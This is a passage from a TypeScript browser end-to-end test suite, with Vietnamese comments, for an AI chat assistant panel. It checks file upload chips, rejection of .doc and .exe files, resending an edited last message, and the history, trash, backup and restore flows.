        await c.panel.waitForFunction(() => document.querySelectorAll('.composer .chip-doc').length === 0 && document.querySelectorAll('.chip-doc').length === 3, { timeout: 10_000 });
        expect(await c.panel.evaluate(() => document.body.innerText.includes('Công ty Cổ phần Hoa Sen đạt doanh thu'))).toBe(false);
        if (SHOTS) await c.panel.screenshot({ path: path.join(SHOTS, `${name}-upload-sent.png`) });
        expect(errors.filter((e) => !/favicon|Failed to load resource/i.test(e))).toEqual([]);
      });

      it('kéo-thả: CSV được đọc; Office đời cũ (.doc) và loại lạ (.exe) bị từ chối kèm thông báo rõ ràng, không thành chip; bấm × gỡ tệp', async () => {
        await newRun(c);
        await c.panel.bringToFront();
        await clearComposer();
        await drop([
          { name: 'khach-hang.csv', type: 'text/csv', content: 'tên,điện thoại\nAn,0901234567\nBình,0912345678\n' },
          { name: 'cu.doc', type: 'application/msword', content: 'x' },
          { name: 'phan-mem.exe', type: 'application/octet-stream', content: 'MZ' },
        ]);
        await settled(1);
        expect(await c.panel.$$eval('.composer .chip-doc .chip-text', (els) => els.map((e) => e.textContent))).toEqual(['khach-hang.csv']);
        expect(await c.panel.$eval('.composer .chip-doc', (e) => e.getAttribute('title'))).toContain('3 hàng');
        const body = await c.panel.evaluate(() => document.body.innerText);
        expect(body).toContain('Office đời cũ');
        expect(body).toContain('Chưa hỗ trợ tệp "phan-mem.exe"');
        await c.panel.click('.composer .chip-doc .chip-x');
        await c.panel.waitForFunction(() => document.querySelectorAll('.composer .chip-doc').length === 0, { timeout: 5000 });
      });

      it('"Sửa tin nhắn cuối" đưa tệp đã gửi trở lại ô nhập (có chữ), gửi lại được', async () => {
        await newRun(c);
        await c.panel.bringToFront();
        await c.panel.evaluate(async () => (window as any).__ndTest.script([{ text: 'Đã đọc.' }, { text: 'Đọc lại xong.' }]));
        await clearComposer();
        await drop([{ name: 'ghi-chu.txt', type: 'text/plain', content: 'Ghi chú họp: chốt ngân sách 40 triệu đồng.' }]);
        await settled(1);
        await c.panel.type('.composer-input', 'Tóm tắt ghi chú');
        await c.panel.click('.send-btn');
        await c.panel.waitForFunction(() => !(window as any).__nd.controller.isRunning && (window as any).__ndTest.requests().length === 1, { timeout: 20_000, polling: 100 });
        await c.panel.evaluate(() => (window as any).__nd.controller.onMessage({ type: 'edit_last' }));
        await settled(1); // tệp quay lại ô nhập
        expect(await c.panel.$eval('.composer-input', (e) => (e as HTMLTextAreaElement).value)).toBe('Tóm tắt ghi chú');
        await c.panel.click('.send-btn');
        await c.panel.waitForFunction(() => !(window as any).__nd.controller.isRunning && (window as any).__ndTest.requests().length === 2, { timeout: 20_000, polling: 100 });
        const again: string = await c.panel.evaluate(() => (window as any).__ndTest.requests()[1].lastUser);
        expect(again).toContain('chốt ngân sách 40 triệu đồng');
      });

      it('lịch sử an toàn: xoá → vào Thùng rác → khôi phục; sao lưu ra tệp .json; xoá vĩnh viễn rồi khôi phục từ tệp — tệp bối cảnh vẫn nằm trong phiên', async () => {
        const BRIEF = 'BRIEF QUẢNG CÁO: ngân sách 40 triệu, đối tượng nữ 25–34 tuổi tại Hà Nội.';
        const history = () => c.panel.click('button[aria-label="Lịch sử trò chuyện"]');
        const domClick = async (sel: string) => {
          // toast phủ lên đầu trang nhận chuột → bấm bằng DOM; chờ phần tử xuất hiện vì giao diện cập nhật bất đồng bộ sau mỗi lần bấm
          await c.panel.waitForSelector(sel, { timeout: 8000 });
          await c.panel.$eval(sel, (e) => (e as HTMLElement).click());
        };
        const toastText = () => c.panel.evaluate(() => [...document.querySelectorAll('.toast-text')].map((e) => e.textContent).join(' | '));
        const rows = () => c.panel.$$eval('.screen-history .hist-list:not(.is-trash) > .hist-row:not(.is-trashed) .hist-title', (els) => els.map((e) => e.textContent));
        const openTrash = async () => {
          await c.panel.waitForSelector('.hist-trash-head', { timeout: 10_000 });
          if ((await c.panel.$eval('.hist-trash-head', (e) => e.getAttribute('aria-expanded'))) !== 'true') await domClick('.hist-trash-head'); // mục Thùng rác nhớ trạng thái đóng/mở
        };
        // Hồ sơ trình duyệt dùng chung cả bộ test nên đã có sẵn nhiều cuộc trò chuyện từ các bài trước: dọn sạch (kể cả Thùng rác) để bài này kiểm đúng từng con số.
        await c.panel.evaluate(async () => {
          const ctl = (window as any).__nd.controller;
          for (const s of [...ctl.snapshot().view.sessions]) await ctl.onMessage({ type: 'delete_session', id: s.id });
          await ctl.onMessage({ type: 'empty_trash' });
        });
        await newRun(c);
        await c.panel.bringToFront();
        await c.panel.evaluate(async () => (window as any).__ndTest.script([{ text: 'Đây là 3 ý tưởng quảng cáo.' }, { text: 'Tiếp tục.' }]));
        await clearComposer();
        await drop([{ name: 'brief.txt', type: 'text/plain', content: BRIEF }]);
        await settled(1);
        await c.panel.type('.composer-input', 'Lên ý tưởng quảng cáo từ brief');
        await c.panel.click('.send-btn');
        await c.panel.waitForFunction(() => !(window as any).__nd.controller.isRunning && (window as any).__ndTest.requests().length === 1, { timeout: 20_000, polling: 100 });
        await new Promise((r) => setTimeout(r, 400)); // để phiên được lưu

        // 1) xoá cuộc đang mở → vào Thùng rác (có xác nhận), danh sách trống, mục Thùng rác hiện số 1
        await history();
        await c.panel.waitForSelector('.screen-history .hist-row', { timeout: 10_000 });
        expect(await rows()).toEqual(['Lên ý tưởng quảng cáo từ brief']);
        await domClick('.screen-history .hist-row .hist-actions button[aria-label^="Xóa"]');
        await c.panel.waitForSelector('.hist-row.is-confirm', { timeout: 5000 });
        expect(await c.panel.$eval('.hist-row.is-confirm .hist-confirm-text', (e) => e.textContent)).toContain('Thùng rác');
        await domClick('.hist-row.is-confirm .btn-danger');
        await c.panel.waitForSelector('.hist-trash-head', { timeout: 10_000 });
        expect(await c.panel.$eval('.hist-trash-head .badge', (e) => e.textContent)).toBe('1');
        expect(await toastText()).toContain('Thùng rác');
        expect(await rows()).toEqual([]);
        if (SHOTS) await c.panel.screenshot({ path: path.join(SHOTS, `${name}-history-trash-collapsed.png`) });

        // 2) mở Thùng rác → khôi phục
        await openTrash();
        await c.panel.waitForSelector('.hist-row.is-trashed', { timeout: 5000 });
        expect(await c.panel.$eval('.hist-row.is-trashed .hist-meta', (e) => e.textContent)).toMatch(/còn 30 ngày|còn 29 ngày/);
        if (SHOTS) await c.panel.screenshot({ path: path.join(SHOTS, `${name}-history-trash-open.png`) });
        await domClick('.hist-row.is-trashed button[aria-label="Khôi phục"]');
        await c.panel.waitForFunction(() => !document.querySelector('.hist-trash-head') && document.querySelectorAll('.screen-history .hist-row').length === 1, { timeout: 10_000 });
        expect(await rows()).toEqual(['Lên ý tưởng quảng cáo từ brief']);

        // 3) "Sao lưu tất cả": tải về MỘT tệp .json có đủ lịch sử và tệp bối cảnh
        await c.panel.evaluate(() => {
          const w = window as any;
          w.__blobs = [];
          const orig = URL.createObjectURL.bind(URL);
          URL.createObjectURL = (b: Blob | MediaSource) => (w.__blobs.push(b), orig(b));
        });
        const buttons = await c.panel.$$('.hist-tools button');
        expect(await Promise.all(buttons.map((b) => b.evaluate((e) => e.textContent)))).toEqual(['Sao lưu tất cả', 'Khôi phục từ tệp']);
        // Thông báo "Đã chuyển vào Thùng rác / Đã khôi phục" đang phủ lên vùng này (toast nhận chuột) → bấm bằng DOM chứ không bằng toạ độ
        await buttons[0].evaluate((b) => (b as HTMLElement).click());
        await c.panel.waitForFunction(() => (window as any).__blobs.length >= 1, { timeout: 10_000 });
        const backupText: string = await c.panel.evaluate(async () => (window as any).__blobs.at(-1).text());
        const backup = JSON.parse(backupText);
        expect(backup).toMatchObject({ format: 'ai-agent-sessions', version: 1 });
        expect(backup.sessions).toHaveLength(1);
        expect(backupText).toContain('ngân sách 40 triệu');
        expect(await toastText()).toContain('Đã tạo tệp sao lưu');
        const backupFile = path.join(tmp, 'sao-luu.json');
        fs.writeFileSync(backupFile, backupText);

        // 4) xoá vĩnh viễn (qua Thùng rác) → mất hẳn khỏi cả hai danh sách
        await domClick('.screen-history .hist-row .hist-actions button[aria-label^="Xóa"]');
        await domClick('.hist-row.is-confirm .btn-danger');
        await c.panel.waitForSelector('.hist-trash-head', { timeout: 10_000 });
        await openTrash();
        await domClick('.hist-row.is-trashed button[aria-label="Xóa vĩnh viễn"]');
        await domClick('.hist-row.is-confirm .btn-danger');
        await c.panel.waitForFunction(() => !document.querySelector('.hist-trash-head'), { timeout: 10_000 });
        expect(await rows()).toEqual([]);

        // 5) khôi phục từ tệp sao lưu → cuộc trò chuyện quay lại; mở ra thì tệp bối cảnh vẫn nằm trong phiên và trò chuyện tiếp được
        const input = await c.panel.$('.hist-tools input[type=file]');
        await input!.uploadFile(backupFile);
        await c.panel.waitForFunction(() => document.querySelectorAll('.screen-history .hist-row').length === 1, { timeout: 15_000 });
        expect(await toastText()).toContain('Đã khôi phục 1 cuộc trò chuyện');
        expect(await rows()).toEqual(['Lên ý tưởng quảng cáo từ brief']);
        if (SHOTS) await c.panel.screenshot({ path: path.join(SHOTS, `${name}-history-restored.png`) });
        await domClick('.screen-history .hist-row .hist-main');
        await c.panel.waitForFunction(() => document.querySelector('.chip-doc') !== null, { timeout: 10_000 });
        expect(await c.panel.evaluate(() => JSON.stringify((window as any).__nd.controller.session.messages))).toContain('ngân sách 40 triệu');
        await c.panel.type('.composer-input', 'Viết thêm 2 mẫu nữa');
        await c.panel.click('.send-btn');
        await c.panel.waitForFunction(() => !(window as any).__nd.controller.isRunning && (window as any).__ndTest.requests().length === 2, { timeout: 20_000, polling: 100 });
        expect(errors.filter((e) => !/favicon|Failed to load resource/i.test(e))).toEqual([]);
      });
    });

  });
});
